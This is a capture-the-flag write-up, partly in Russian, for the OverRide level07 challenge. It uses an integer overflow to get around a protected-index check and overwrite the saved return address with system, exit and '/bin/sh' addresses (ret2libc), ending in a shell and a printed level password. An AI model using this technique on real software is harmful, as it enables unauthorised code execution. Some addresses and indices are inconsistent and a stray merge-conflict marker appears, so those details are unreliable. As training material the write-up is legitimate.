1. See dissasembly, we can understand 
	- the program creates a data table, where it stores 100 numbers at indexes
	- some indexes (index % 3 == 0) are protected
	- we can maxint overflow to access protected indexes
2. Find adress of system, exit, bin/sh
gdb -q level07
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
Undefined command: "gdb".  Try "help".
(gdb) b*main
Breakpoint 1 at 0x8048723
(gdb) run
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048723 in main ()
(gdb) p exit
$1 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) p system
$2 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:      "/bin/sh"

3. Мы работаем с UINT MAX, так как бинарник принимает в настоящем формате.

(gdb) b *0x0804892b - это адрес read_number
Breakpoint 1 at 0x804892b
(gdb) r - дальше запускаем
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: read - ! запускаем команду чтения

Breakpoint 1, 0x0804892b in main ()
(gdb) info frame - ! смотрим у функции адрес eip
Stack level 0, frame at 0xffffd710:
 eip = 0x804892b in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args: 
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c - ! вот он адрес EIP
(gdb) p/d 0xffffd6fc
$1 = 4294956796 - ! значение в десятичной
(gdb) info registers - ! смотрим регистры
eax            0xffffd544       -10940 - ! адрес ячейки 0xffffd544
(gdb) p/d 0xffffd70c - ! Выводим EIP адрес в десятичной тоже
$2 = 4294956812
(gdb) p/d 0xffffd544
$3 = 4294956356
(gdb) 4294956812 - 4294956356 - ! вычисляем из адреса конца функции адрес ячейки
и получаем разницу 456 <--- это индекс ячейки в массиве. Но так как у нас
умножается и так на 4 в бинарнике, мы его делим на 4 = 114.
114 кратно 3-м, соответственно, мы заходим в эту ячейку через переполнение
UINT MAX 4294967296 / 4 = 1073741824 + 114;
Т.е. в бинарнике 1073741824 + 114 * 4 = 114, которые обошли % 3.

*EIP - указатель команд, и содержит оффсет (величину смещения относительно начала программы) на линию кода, которая будет исполняться следующей

	1073741938 % 3 = 1

4. Create our script in decimal
  [ address of EIP ] = [ address of system ] [ address of exit ] [ address of "/bin/sh" ]
   0xffffd6bc           0xf7e6aed0           0xf7e5eb70             0xf7f897ec          # address
                        4159090384           4159040368             4160264172          # in decimal, to be number input
                            |                     |                     |
                        1073741938           115                    115                 # index to use
                        data[114]            data[115]              data[116]  
5. Use our script
	level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
<<<<<<< HEAD
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC1. 

